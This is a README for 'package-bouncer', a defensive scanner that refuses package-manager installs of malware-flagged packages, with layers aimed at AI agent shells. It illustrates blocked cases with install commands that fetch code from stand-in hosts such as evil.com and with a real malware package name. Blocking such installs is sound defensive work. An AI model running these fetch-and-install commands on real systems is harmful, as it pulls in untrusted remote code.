# package-bouncer

A command-level malware scanner for package managers. Aggregates intel
from four upstream feeds (Aikido, OpenSSF malicious-packages, OSV,
PyPA advisory-db), deduplicates, and refuses to let an install proceed
if any source flags the requested package — at any version.

**Status:** ready for colleague use on macOS. Linux untested in this
revision; the C interposer should build but layer 4's mise/asdf
discovery paths haven't been verified on a Linux box.

## What it actually blocks

Tested end-to-end on a macOS / mise / homebrew dev machine against the
Aikido feed's `chai-as-upgraded` malware sample. All of these get
refused:

```sh
npm install chai-as-upgraded                                  # bare name
/opt/homebrew/bin/npm install chai-as-upgraded                # absolute path
~/.local/share/mise/installs/node/24.7.0/bin/npm install …    # mise install dir
npm install https://example.com/evil.tgz                      # opaque tarball URL
bouncer npm ci  # against a lockfile naming a flagged package # transitive coverage

# Python subprocess.run with absolute path AND stripped env — the case
# agents do constantly:
subprocess.run(["/opt/homebrew/bin/npm", "install", "chai-as-upgraded"],
               shell=False, env={"PATH": "/usr/bin:/bin"})       # also refused
```

The version on the lockfile or argv doesn't need to match the version
the upstream feed recorded — the gate refuses on package name.

## Quick install (60 seconds)

```sh
git clone https://github.com/brynbellomy/package-bouncer.git
cd package-bouncer
make install                                # builds → ~/.local/bin/bouncer
make interposer                             # builds libbouncer_interpose.dylib
bouncer sync                                # first-time intel fetch (~10s)

# Layer 2 — PATH shims (any agent shell)
bouncer install-shims

# Layer 1 — Claude Code Bash hook (if you use Claude Code)
bouncer install-claude-hook

# Layer 3 — native execve interposer (closes subprocess.run([abs_path]))
bouncer install-preload --lib $(pwd)/libbouncer_interpose.dylib --shell-rc auto

# Layer 4 — real-binary wrappers (the strongest layer; wraps homebrew/mise binaries)
bouncer install-wrappers

# Verify
bouncer doctor
```

Then `source ~/.zshrc` (or open a new terminal) for the interposer env
vars to take effect.

If `bouncer doctor` shows mise shadowing the Layer 2 shims, see
[mise PATH ordering](#mise-path-ordering) below.

## Defense layers

Four composing layers. Each catches a different class of agent
behavior. None is sufficient alone; together they cover the realistic
agent-bash threat surface.

| # | Layer | Catches | Install |
|---|---|---|---|
| 1 | Claude Code PreToolUse hook | Bash tool calls inside a Claude session, before the shell sees them | `bouncer install-claude-hook` |
| 2 | PATH shims (`~/.local/bin/{npm,pip,…}`) | bare-name PM invocations in any shell that inherits the user's PATH | `bouncer install-shims` |
| 3 | Native execve interposer (`DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`) | absolute-path invocations and `subprocess.run([abs])` in processes that inherit the preload env var | `bouncer install-preload --lib ./libbouncer_interpose.{dylib,so}` |
| 4 | Real-binary wrappers | absolute-path invocations even when env vars are stripped — the dylib doesn't need to load | `bouncer install-wrappers` |

Layer 4 is the strongest single layer because it requires no env-var
inheritance and no process cooperation — the bytes at
`/opt/homebrew/bin/npm` *are* bouncer. The tradeoff: `brew upgrade
node` or `mise install node@whatever` overwrites the wrapper. Re-run
`bouncer install-wrappers` after toolchain upgrades; `bouncer doctor`
flags drift.

## Why this design

Existing shell-function-based protection (e.g. Aikido `safe-chain`)
fails open in several real-world cases:

- the package manager is invoked through a wrapper that `execvp`'s the
  binary directly (`timeout npm install …`, `xargs … npm install …`,
  build systems, subprocess calls from Python/Go),
- the command runs in a non-interactive shell that didn't source the
  shim init script (CI, agent shells),
- the underlying tool's network behavior bypasses HTTPS-proxy
  enforcement (observed with `bun`'s package resolver — the motivating
  case for this project),
- the call uses an absolute path (`subprocess.run(["/opt/homebrew/bin/npm",
  …], shell=False)`) — agents do this constantly.

`bouncer` operates at the command layer: it parses argv, looks up
package names against an aggregated malware database, and refuses or
passes through. Because the check happens before the package manager
runs, none of the failure modes above apply.

## Architecture

```
intel/             ← parent: Source interface, MalwareReport, Store
intel/sources/
  aikido/          ← https://malware-list.aikido.dev (implemented)
  openssf/         ← github.com/ossf/malicious-packages (implemented)
  osv/             ← osv.dev MAL-* advisories (implemented)
  pypa/            ← github.com/pypa/advisory-database (PyPI; implemented)

packagemanager/    ← parent: PackageManager interface, Install
packagemanager/
  npm/ pnpm/ yarn/ bun/       ← jsspec-backed
  pip/ uv/ poetry/ pdm/       ← pyspec-backed
  exec/                       ← parameterized for npx/bunx/pnpx/uvx/pipx
  jsspec/ pyspec/ argv/       ← shared spec parsers
  jsmanifest/ pymanifest/     ← package.json / pyproject.toml expanders
  jslock/ pylock/             ← lockfile expanders (transitive coverage)
  pyreq/                      ← requirements.txt expander

gate/              ← decision logic (allow / refuse / passthrough / abort)
internal/hook/     ← Claude Code analyzer (Layer 1)
internal/interposer/  ← native execve/posix_spawn hooks in C (Layer 3)
cmd/bouncer/       ← CLI entrypoint
hooks/             ← per-agent integration docs
```

**Lookup policy: name match wins.** Every source we ingest is
malware-only; the version field on a report is the version the source
sampled, not "only this version is bad." So a query for `(name, X.Y.Z)`
that finds any report for the same name — at any version — refuses.
This closes two real bypass paths: an attacker republishing the same
name under a new version, and a lockfile pinning a version the source
didn't sample.

**Transitive coverage via lockfiles.** When an install verb runs in a
project with a lockfile (`package-lock.json`, `pnpm-lock.yaml`,
`yarn.lock`, `uv.lock`, `poetry.lock`, `pdm.lock`), bouncer parses the
full resolved transitive tree and gates every (name, version) tuple in
it — not just the verb's explicit argv. This is the only way to catch
a flagged transitive dep that's been pinned into the lockfile without
running the resolver ourselves.

**Fail-closed defaults.** Per-source malware feeds are fetched
concurrently with etag-based caching in `~/.cache/package-bouncer/`.
On network outage the last good snapshot is used; if zero sources
succeed on the very first run, the bouncer refuses installs rather
than fail open. A sanity floor of 1000 reports total catches the
"every feed returned []" case loudly.

## Usage

```sh
# Gate an install (same shape as safe-chain's CLI).
bouncer npm install lodash         # → exec real npm
bouncer npm install chai-as-upgraded
# bouncer: install refused — malware intelligence flagged the following:
#   - chai-as-upgraded@<any> (ecosystem: npm)
#       [aikido] MALWARE

# Refresh malware intel manually.
bouncer sync

# Show source health and cache location.
bouncer status

# Verify all defense layers and intel state — run after any install.
bouncer doctor
```

`bouncer help` lists every subcommand grouped by layer.

### Environment

| Variable | Default | Purpose |
|---|---|---|
| `BOUNCER_CACHE_DIR` | `$XDG_CACHE_HOME/package-bouncer` | where intel snapshots live |
| `BOUNCER_SOURCES` | `aikido,openssf,osv,pypa` | comma-separated source IDs to enable |
| `BOUNCER_LOG` | (info) | set `debug` for verbose logging |
| `BOUNCER_BYPASS` | (unset) | prepend `BOUNCER_BYPASS=1 ` to skip the gate for one invocation |
| `BOUNCER_ALLOW_OPAQUE` | `0` | set `1` to opt URL/git/tarball installs through the gate (refused by default) |
| `BOUNCER_PATH` | (set by install-preload) | consumed by the Layer 3 interposer |

### Refuse-opaque-by-default

`npm install https://evil.com/foo.tgz`, `pip install
git+https://evil.com/repo`, and `bun install user/repo` (npm's GitHub
shorthand) all bypass the package-registry name lookup — there's no
name to look up against. Bouncer's default policy refuses these
outright with a `[bouncer-policy]` source marker so they're
distinguishable from a malware-feed-driven block. Filesystem-path
specs (`./pkg`, `/abs/path`) still pass through — they don't pull
remote code on their own.

## mise PATH ordering

mise prepends its install dir(s) to PATH on `mise activate`. For
Layer 2 shims to win, `~/.local/bin` must come AFTER mise activate:

```sh
# ~/.zshrc
eval "$(mise activate zsh)"             # mise prepends ITS dirs
export PATH="$HOME/.local/bin:$PATH"    # then bouncer takes the front
```

If mise's `chpwd` hook re-prepends and undoes the reorder on every
`cd`, add this precmd to pin the order:

```sh
_bouncer_pin_path() { case ":$PATH:" in
  ":$HOME/.local/bin:"*) ;;
  *) PATH="$HOME/.local/bin:${PATH//$HOME\/.local\/bin:/}" ;;
esac }
precmd_functions+=(_bouncer_pin_path)
```

`bouncer doctor` detects mise (and asdf, pyenv, nvm) install dirs that
shadow Layer 2 shims and emits this recipe inline in the failure
output.

If you'd rather not touch PATH ordering at all, Layer 4
(`install-wrappers`) sidesteps the issue entirely: it wraps the actual
binaries at their install paths, so PATH lookup order stops mattering.

## Threat model and fail-closed semantics

**Fail-closed guarantees** (the gate refuses the install in all of
these):

- **Malicious package**: any source flags it → exit 1, "install
  refused — malware intelligence flagged …"
- **Opaque-spec install** (URL / git / tarball / `user/repo`
  github-shorthand): refused by default → exit 1,
  `[bouncer-policy]` source. Set `BOUNCER_ALLOW_OPAQUE=1` to opt in
  after independently verifying the source.
- **Intel store cannot refresh** (every source failed, no cache):
  exit 70, "INTERNAL ERROR — intel refresh failed"
- **Intel store implausibly empty** (< 1000 reports total — aikido
  alone ships >120k): exit 70, "INTERNAL ERROR — intel store has
  only N reports"
- **Manifest file present but unreadable / malformed** (`package.json`,
  `pyproject.toml`, `requirements.txt`, lockfiles): exit 70, "INTERNAL
  ERROR — install aborted fail-closed"
- **Claude Code hook crashes** (parser bug, malformed input): hook
  emits a "deny" with "INTERNAL ERROR in hook script"; if even that
  fails, exits 2 which Claude Code treats as a blocking error
- **Claude Code hook detects bouncer binary missing on PATH**: hook
  denies with a hard "DO NOT retry" message naming the mis-install

**Known limitations** (what bouncer cannot protect against):

- **SIP-protected binaries on macOS** (`/usr/bin/pip3`,
  `/usr/bin/python3 -m pip …`). `DYLD_INSERT_LIBRARIES` is stripped
  by dyld for `/usr/bin/*` and `/System/...`; the dir is also
  read-only so Layer 4 wrappers can't be installed there. Out of
  bouncer's reach by design — it's a command-layer scanner, not a
  kernel-level interposer.
- **Toolchain upgrades wiping Layer 4 wrappers**. `brew upgrade node`
  re-installs the real npm binary on top of our symlink. `bouncer
  doctor` flags this; re-run `bouncer install-wrappers --force` after
  upgrades.
- **Compromised upstream returning near-empty feeds**. The 1000-report
  floor catches the worst case (literally empty), but a feed that
  omits most malware while still returning hundreds of entries would
  slip through. Track-and-alert on report-count drops is future work.
- **Statically-linked binaries that bypass libc**. Theoretical; no
  real PM does this today.

### Verifying your install

Run `bouncer doctor` in a fresh terminal. It checks:

- `bouncer` resolves on PATH and is executable.
- The shim directory is on PATH, and each PM shim wins the PATH
  lookup (no mise/homebrew binary shadowing it earlier). If a mise
  shadow is detected, the recipe to fix it appears inline in the
  output.
- The Claude Code Bash hook is wired in `~/.claude/settings.json`.
- The native interposer env vars are exported and the library file
  exists.
- Layer 4 wrappers — every recorded wrapper still points at bouncer
  and its `.bouncer-original` sibling is intact.
- The intel store is above the 1000-report sanity floor and was
  refreshed in the last 24 hours.

Each row is PASS / WARN / FAIL with a one-line fix. The command exits
1 if any row is FAIL — useful as a CI tripwire or a shell-rc check.

## License

TBD (planning open source once the design has settled).
